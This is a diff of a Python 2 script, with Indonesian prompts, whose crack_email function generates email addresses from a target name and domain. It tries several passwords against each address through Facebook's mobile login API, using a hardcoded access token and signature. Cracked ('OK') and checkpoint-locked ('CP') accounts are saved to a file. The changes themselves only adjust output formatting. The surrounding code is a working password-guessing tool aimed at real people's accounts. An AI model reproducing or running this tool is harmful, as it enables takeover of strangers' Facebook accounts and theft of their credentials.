@@ -505,10 +505,10 @@ def crack_email():
     os.system('clear')
     print logo
     try:
-        print '\033[1;96m[+] \033[1;93mContoh : \033[1;31m upil.pilek upil_pilek upil pilek'
+        print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil \033[1;93mupil_ \033[1;31mupil.pilek \033[1;96dll'
         c = raw_input('\033[1;96m[+] \x1b[1;34mNama Target : \033[1;31m ')
-        print '\033[1;96m[+] \033[1;93mContoh : \033[1;31m@hotmail.com,@yahoo.com,@gmail.com'
-        k = raw_input('\033[1;96m[+] \033[1;34mDomain Email :\x1b[1;97m ')
+        print '\033[1;96m[+] \033[1;93mContoh : \033[1;31m@yahoo.com,\033[1;34@gmail.com \033[1;96dll'
+        k = raw_input('\033[1;96m[+] \033[1;34mDomain Email :\033[1;97m ')
         print '\033[1;96m[+] \033[1;93mContoh : \033[1;96mbagas123'
         pass1 = raw_input('\033[1;96m[+] \033[1;93mPassword1 : \033[1;31m ')
         pass2 = raw_input('\033[1;96m[+] \033[1;93mPassword2 : \033[1;31m ')
@@ -552,13 +552,13 @@ def crack_email():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             w = json.load(data)
             if 'access_token' in w:
-                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass1
+                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass1
                 okb = open('save/email.txt', 'a')
                 okb.write('[OK] ' + c + user + k + ' | ' + pass1 + '\n')
                 okb.close()
                 oks.append(user + pass1)
             elif 'www.facebook.com' in w['error_msg']:
-                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass1
+                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass1
                 cps = open('save/email.txt', 'a')
                 cps.write('[CP] ' + c + user + k + ' | ' + pass1 + '\n')
                 cps.close()
@@ -567,13 +567,13 @@ def crack_email():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 w = json.load(data)
                 if 'access_token' in w:
-                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass2
+                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass2
                     okb = open('save/email.txt', 'a')
                     okb.write('[OK] ' + c + user + k + ' | ' + pass2 + '\n')
                     okb.close()
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in w['error_msg']:
-                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass2
+                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass2
                     cps = open('save/email.txt', 'a')
                     cps.write('[CP] ' + c + user + k + ' | ' + pass2 + '\n')
                     cps.close()
@@ -582,13 +582,13 @@ def crack_email():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     w = json.load(data)
                     if 'access_token' in w:
-                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass3
+                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass3
                         okb = open('save/email.txt', 'a')
                         okb.write('[CP] ' + c + user + k + ' | ' + pass3 + '\n')
                         okb.close()
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in w['error_msg']:
-                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass3
+                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass3
                         cps = open('save/email.txt', 'a')
                         cps.write('[CP] ' + c + user + k + ' | ' + pass3 + '\n')
                         cps.close()
@@ -597,13 +597,13 @@ def crack_email():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         w = json.load(data)
                         if 'access_token' in w:
-                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass4
+                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass4
                             okb = open('save/email.txt', 'a')
                             okb.write('[OK] ' + c + user + k + ' | ' + pass4 + '\n')
                             okb.close()
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in w['error_msg']:
-                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass4
+                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass4
                             cps = open('save/email.txt', 'a')
                             cps.write('[CP] ' + c + user + k + ' | ' + pass4 + '\n')
                             cps.close()
@@ -612,13 +612,13 @@ def crack_email():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             w = json.load(data)
                             if 'access_token' in w:
-                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass5
+                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass5
                                 okb = open('save/email.txt', 'a')
                                 okb.write('[OK]' + c + user + k + ' | ' + pass5 + '\n')
                                 okb.close()
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in w['error_msg']:
-                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   '  '  +  pass5
+                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass5
                                 cps.open('save/email.txt', 'a')
                                 cps.write('[CP]' + c + user + k + ' | ' + pass5 + '\n')
                                 cps.close()
